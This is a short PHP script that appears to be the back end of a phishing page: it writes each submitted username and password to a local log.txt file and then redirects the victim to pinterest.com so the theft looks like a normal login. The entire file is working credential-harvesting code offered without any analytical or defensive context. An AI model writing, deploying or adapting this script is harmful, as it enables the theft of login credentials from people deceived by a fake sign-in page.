<?php

    file_put_contents("log.txt", "Username: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com');
exit();
